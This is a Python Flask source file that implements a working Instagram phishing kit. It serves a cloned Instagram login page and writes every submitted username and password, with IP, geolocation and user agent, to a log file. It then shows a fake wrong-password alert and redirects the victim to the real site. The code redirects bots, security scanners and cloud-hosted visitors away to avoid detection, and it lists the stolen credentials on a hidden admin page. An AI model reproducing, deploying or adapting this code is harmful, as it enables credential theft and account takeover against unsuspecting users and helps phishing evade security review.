from flask import Flask, request, render_template_string, redirect, abort, session
import datetime
import json
import base64
import random
import string
import re
import os
import threading
import requests
import socket
import hashlib
from functools import wraps

app = Flask(__name__)
app.secret_key = hashlib.md5(os.urandom(32)).hexdigest()

# ============ CONFIGURACIÓN ============
ADMIN_PATH = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
BLOCK_SANDBOX = True
ENABLE_GEOLOCATION = True
LOG_FILE = "creds.json"

# ============ UTILIDADES ============
def generate_random_string(length=20):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr or 'unknown'

# ============ DETECCIÓN DE SANDBOX/BOTS ============
def is_suspicious_request():
    user_agent = request.headers.get('User-Agent', '').lower()
    ip = get_client_ip()
    
    bot_signatures = ['bot', 'crawler', 'spider', 'scan', 'security', 'googlebot', 
                      'bingbot', 'censys', 'shodan', 'urlscan', 'phantomjs', 'headless']
    
    if any(sig in user_agent for sig in bot_signatures):
        return True
    
    suspicious_headers = ['X-Scanner', 'X-VirusTotal', 'X-Request-Id', 'X-Security']
    for header in suspicious_headers:
        if header in request.headers:
            return True
    
    if BLOCK_SANDBOX:
        try:
            hostname = socket.gethostbyaddr(ip)[0].lower()
            cloud_providers = ['amazonaws', 'googleusercontent', 'azure', 'digitalocean', 
                           'linode', 'vultr', 'oraclecloud', 'shadowserver']
            if any(provider in hostname for provider in cloud_providers):
                return True
        except:
            pass
    
    return False

# ============ GEOLOCALIZACIÓN ============
def get_geolocation(ip):
    if not ENABLE_GEOLOCATION or ip in ['127.0.0.1', 'localhost']:
        return "Local/Private"
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        data = response.json()
        if data.get('status') == 'success':
            return f"{data.get('city')}, {data.get('country')}"
    except:
        pass
    return "Unknown"

# ============ HTML MEJORADO ============
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/1ZPbb5we7KD.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #fafafa; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .main-container { display: flex; justify-content: center; align-items: center; flex: 1; margin-top: 32px; }
        .content-wrapper { display: flex; align-items: center; max-width: 935px; width: 100%; }
        .phone-section { flex: 1; display: flex; justify-content: center; align-items: center; margin-right: 32px; }
        .phone-img { max-width: 100%; height: auto; }
        .login-section { flex: 1; max-width: 350px; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; margin-bottom: 10px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 175px; height: auto; }
        .input-group { margin-bottom: 6px; }
        .input-group input { width: 100%; padding: 9px 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; outline: none; }
        .input-group input:focus { border-color: #a8a8a8; }
        .login-btn { width: 100%; padding: 8px; margin-top: 14px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; opacity: 0.7; }
        .login-btn.active { opacity: 1; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; text-transform: uppercase; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .divider::before { margin-right: 18px; }
        .divider::after { margin-left: 18px; }
        .fb-login { display: flex; align-items: center; justify-content: center; color: #385185; font-weight: 600; font-size: 14px; margin: 20px 0; cursor: pointer; }
        .fb-login svg { margin-right: 8px; }
        .forgot { text-align: center; color: #00376b; font-size: 12px; margin-top: 12px; cursor: pointer; }
        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px; text-align: center; font-size: 14px; }
        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
        .get-app { text-align: center; margin-top: 20px; }
        .get-app p { margin-bottom: 20px; font-size: 14px; color: #262626; }
        .app-stores { display: flex; justify-content: center; gap: 8px; }
        .app-stores img { height: 40px; }
        .error-msg { color: #ed4956; font-size: 14px; text-align: center; margin: 10px 0; display: none; }
        .footer { margin-top: 60px; margin-bottom: 40px; text-align: center; }
        .footer-links { margin-bottom: 16px; display: flex; flex-wrap: wrap; justify-content: center; gap: 16px; }
        .footer-links a { color: #8e8e8e; text-decoration: none; font-size: 12px; }
        .copyright { color: #8e8e8e; font-size: 12px; }
        @media (max-width: 875px) { .phone-section { display: none; } }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="content-wrapper">
            <div class="phone-section">
                <img src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png" class="phone-img" alt="Phones">
            </div>
            <div class="login-section">
                <div class="login-box">
                    <div class="logo">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 175 50">
                            <path fill="#262626" d="M8.5 2.7c-2.8 1.3-5.3 4.2-6.1 7.1-.8 2.8-.9 19.7-.2 22.5.7 2.8 3.2 5.7 6 7.1 2.3 1.1 28.5 1.1 30.8 0 2.8-1.4 5.3-4.3 6-7.1.7-2.8.6-19.7-.2-22.5-.8-2.9-3.3-5.8-6.1-7.1-2.3-1.1-28.5-1.1-30.8 0zM24 37.5c-7.2 0-8.2-.3-9.6-1.7-1.4-1.4-1.7-2.4-1.7-9.6s.3-8.2 1.7-9.6c1.4-1.4 2.4-1.7 9.6-1.7s8.2.3 9.6 1.7c1.4 1.4 1.7 2.4 1.7 9.6s-.3 8.2-1.7 9.6c-1.4 1.4-2.4 1.7-9.6 1.7zm-2.5-14c-2.5 0-4.5 2-4.5 4.5s2 4.5 4.5 4.5 4.5-2 4.5-4.5-2-4.5-4.5-4.5zm5 0c-2.5 0-4.5 2-4.5 4.5s2 4.5 4.5 4.5 4.5-2 4.5-4.5-2-4.5-4.5-4.5z"/>
                            <text x="45" y="35" font-family="Arial" font-size="28" font-weight="bold" fill="#262626">Instagram</text>
                        </svg>
                    </div>
                    <form method="POST" action="/login" id="loginForm">
                        <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
                        <div class="input-group">
                            <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required autocomplete="off">
                        </div>
                        <div class="input-group">
                            <input type="password" name="password" id="password" placeholder="Password" required autocomplete="off">
                        </div>
                        <button type="submit" class="login-btn" id="loginBtn">Log In</button>
                    </form>
                    <div class="divider">or</div>
                    <div class="fb-login">
                        <svg width="16" height="16" fill="#385185" viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/></svg>
                        Log in with Facebook
                    </div>
                    <div class="forgot">Forgot password?</div>
                </div>
                <div class="signup-box">
                    Don't have an account? <a href="#">Sign up</a>
                </div>
                <div class="get-app">
                    <p>Get the app.</p>
                    <div class="app-stores">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="footer-links">
            <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
            <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
            <a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
        </div>
        <div class="copyright">© 2025 Instagram from Meta</div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            document.getElementById('loginBtn').textContent = 'Please wait...';
            document.getElementById('loginBtn').disabled = true;
        });
    </script>
</body>
</html>"""

# ============ PANEL ADMIN ============
ADMIN_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel</title>
    <style>
        body { font-family: Arial; background: #1a1a1a; color: #fff; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #333; }
        tr:hover { background: #2a2a2a; }
        .cred { font-family: monospace; color: #00ff88; }
        .ip { color: #66b3ff; }
        .time { color: #ffaa00; }
        h1 { color: #ff4444; }
        .stats { margin: 20px 0; padding: 15px; background: #2a2a2a; border-radius: 8px; }
    </style>
</head>
<body>
    <h1>🔴 Captured Credentials</h1>
    <div class="stats">
        <strong>Total:</strong> {{ count }} | <strong>File:</strong> {{ log_file }}
    </div>
    <table>
        <tr>
            <th>Time</th>
            <th>IP</th>
            <th>Location</th>
            <th>Username</th>
            <th>Password</th>
            <th>User-Agent</th>
        </tr>
        {% for entry in entries %}
        <tr>
            <td class="time">{{ entry.timestamp }}</td>
            <td class="ip">{{ entry.ip }}</td>
            <td>{{ entry.location }}</td>
            <td class="cred">{{ entry.username }}</td>
            <td class="cred">{{ entry.password }}</td>
            <td style="font-size: 11px; max-width: 300px; overflow: hidden;">{{ entry.user_agent[:50] }}...</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>"""

# ============ RUTAS ============
@app.route("/")
def index():
    if is_suspicious_request():
        return redirect("https://www.instagram.com", code=302)
    return render_template_string(HTML_TEMPLATE)

@app.route("/login", methods=["POST"])
def login():
    if is_suspicious_request():
        return redirect("https://www.instagram.com", code=302)
    
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    
    if not username or not password:
        return redirect("/")
    
    ip = get_client_ip()
    
    data = {
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "username": username,
        "password": password,
        "ip": ip,
        "location": get_geolocation(ip),
        "user_agent": request.headers.get('User-Agent', ''),
        "referer": request.headers.get('Referer', 'Direct')
    }
    
    # Guardar en archivo
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")
    
    # Redirigir al login real con mensaje de error
    return """
    <script>
        alert("Sorry, your password was incorrect. Please double-check your password.");
        window.location.href = "https://www.instagram.com/accounts/login/?error=1";
    </script>
    """

@app.route(f"/{ADMIN_PATH}")
def admin_panel():
    entries = []
    try:
        with open(LOG_FILE, "r") as f:
            for line in f:
                try:
                    entries.append(json.loads(line.strip()))
                except:
                    pass
    except:
        pass
    
    entries.reverse()  # Más recientes primero
    
    return render_template_string(ADMIN_TEMPLATE, 
                               entries=entries, 
                               count=len(entries),
                               log_file=LOG_FILE)

# ============ INICIO ============
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)